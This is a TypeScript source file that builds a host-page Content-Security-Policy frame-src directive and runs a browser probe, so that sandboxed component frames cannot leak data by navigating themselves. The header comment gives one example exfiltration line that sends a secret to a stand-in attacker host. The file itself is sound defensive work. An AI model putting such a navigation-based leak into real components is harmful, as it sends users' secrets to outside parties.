/**
 * Host-page Content-Security-Policy that stops a component from leaking data by navigating its own frame.
 *
 * Why the host page has to do this: a sandboxed frame (without allow-top-navigation) can still navigate *itself*,
 * e.g. `location.href = 'https://evil.example/?d=' + secret`. CSP3 has no directive for a document's own navigations,
 * so the frame's CSP cannot stop it. What does stop it is the `frame-src` of the page that *embeds* the frame: every
 * navigation of a child frame is checked against it, and a blocked one never sends a request
 * (tests/navigation.spec.ts). See README.md.
 *
 * Dependency-free on purpose: it is also imported by vite.config.ts and can be used from server code.
 */

export interface HostCspOptions {
  /**
   * Origin(s) the sandbox document is served from, for `url` delivery, e.g. `https://sandbox.example-usercontent.com`.
   * A full URL is accepted and reduced to its origin. Omit for an app that only uses `srcdoc` delivery.
   */
  sandboxOrigin?: string | readonly string[];
  /**
   * Allow frames from the app's own origin (`'self'`). Default true. Note that a component can navigate its frame to
   * any URL this policy allows, so every allowed origin should be one you operate.
   */
  allowSelf?: boolean;
}

function toOrigin(value: string): string {
  let url: URL;
  try {
    url = new URL(value);
  } catch {
    throw new Error(`hostPageCsp: sandbox origin must be an absolute http(s) URL or origin, got ${JSON.stringify(value)}`);
  }
  if (url.protocol !== 'https:' && url.protocol !== 'http:') {
    throw new Error(`hostPageCsp: sandbox origin must use http or https, got ${JSON.stringify(value)}`);
  }
  if (url.hostname.includes('*')) throw new Error(`hostPageCsp: wildcards are not allowed in the sandbox origin (${value})`);
  return url.origin;
}

/** The `frame-src` directive alone, e.g. `frame-src 'self' https://sandbox.example.com`. */
export function hostFrameSrc(options: HostCspOptions = {}): string {
  const origins = typeof options.sandboxOrigin === 'string' ? [options.sandboxOrigin] : [...(options.sandboxOrigin ?? [])];
  const sources = [...new Set(origins.map(toOrigin))];
  if (options.allowSelf !== false) sources.unshift("'self'");
  // An empty source list would be invalid; 'none' still allows srcdoc frames (they are not fetched).
  return `frame-src ${sources.length ? sources.join(' ') : "'none'"}`;
}

/**
 * The CSP the page that embeds components must be served with. Send it as its own `Content-Security-Policy` response
 * header (preferred), or as `<meta http-equiv="Content-Security-Policy">` at the top of `<head>`, before any
 * component is created.
 *
 * It only restricts frames. If the app already has a CSP, sending this as an *additional* policy is safe: browsers
 * enforce every policy, so it can only tighten, never loosen, what the app already has.
 */
export function hostPageCsp(options: HostCspOptions = {}): string {
  return hostFrameSrc(options);
}

// ------------------------------------------------------------------------------------------ runtime check

/**
 * The probe target. Any correct policy blocks it; `frame-src *`, `https:` or no policy at all do not. Port 1 is on
 * every browser's blocked-port list and `.invalid` never resolves (RFC 6761), so if the probe is *not* blocked by CSP
 * the navigation still fails locally instead of contacting anything.
 */
export const HOST_CSP_PROBE_URL = 'https://wengu-csp-probe.invalid:1/';

export interface HostProtectionResult {
  /** True when the browser blocked a frame navigation to an arbitrary external origin, as it must. */
  protected: boolean;
  detail: string;
}

let cached: Promise<HostProtectionResult> | null = null;

/**
 * Checks, by asking the browser, whether this page would block a component frame from navigating to an external
 * origin: it creates a hidden, fully sandboxed iframe pointing at {@link HOST_CSP_PROBE_URL} and waits for the
 * `frame-src` violation that an enforced policy produces.
 *
 * What it can tell: whether *some* enforced policy (header or meta) blocks frames to an arbitrary external https
 * origin. What it cannot tell: whether every origin the policy does allow is one you trust (e.g. `frame-src 'self'
 * https://*.cdn.example` passes), or whether something outside the page (Electron's `will-frame-navigate`, a browser
 * extension, an enterprise policy) blocks navigations instead. Report-only policies do not count.
 *
 * A positive result is cached for the page's lifetime (policies can only be added, never removed); a negative one is
 * re-checked on the next call.
 */
export function checkHostNavigationProtection(timeoutMs = 3000): Promise<HostProtectionResult> {
  if (typeof document === 'undefined') {
    return Promise.resolve({ protected: false, detail: 'no document: not running in a browser page' });
  }
  if (cached) return cached;
  const p = new Promise<HostProtectionResult>((resolve) => {
    const iframe = document.createElement('iframe');
    let settled = false;
    let loadTimer: ReturnType<typeof setTimeout> | undefined;
    const finish = (r: HostProtectionResult) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      clearTimeout(loadTimer);
      document.removeEventListener('securitypolicyviolation', onViolation);
      iframe.remove();
      resolve(r);
    };
    const onViolation = (ev: SecurityPolicyViolationEvent) => {
      if (!ev.blockedURI.includes('wengu-csp-probe.invalid')) return;
      if (ev.disposition !== 'enforce') return; // a report-only policy protects nothing
      finish({ protected: true, detail: `blocked by ${ev.effectiveDirective}` });
    };
    const unprotected = 'a frame navigation to an external origin was not blocked: the host page has no enforced CSP frame-src (see hostPageCsp())';
    // The violation event and the frame's (error page) load event race; give the event a moment after load.
    const onLoad = () => {
      loadTimer = setTimeout(() => finish({ protected: false, detail: unprotected }), 100);
    };
    const timer = setTimeout(() => finish({ protected: false, detail: `${unprotected} (no answer within ${timeoutMs} ms)` }), timeoutMs);
    document.addEventListener('securitypolicyviolation', onViolation);
    iframe.setAttribute('sandbox', '');
    iframe.setAttribute('referrerpolicy', 'no-referrer');
    iframe.setAttribute('aria-hidden', 'true');
    iframe.tabIndex = -1;
    iframe.style.cssText = 'display:none';
    iframe.addEventListener('load', onLoad);
    iframe.src = HOST_CSP_PROBE_URL;
    (document.body ?? document.documentElement).append(iframe);
  });
  cached = p;
  void p.then((r) => {
    if (!r.protected && cached === p) cached = null;
  });
  return p;
}
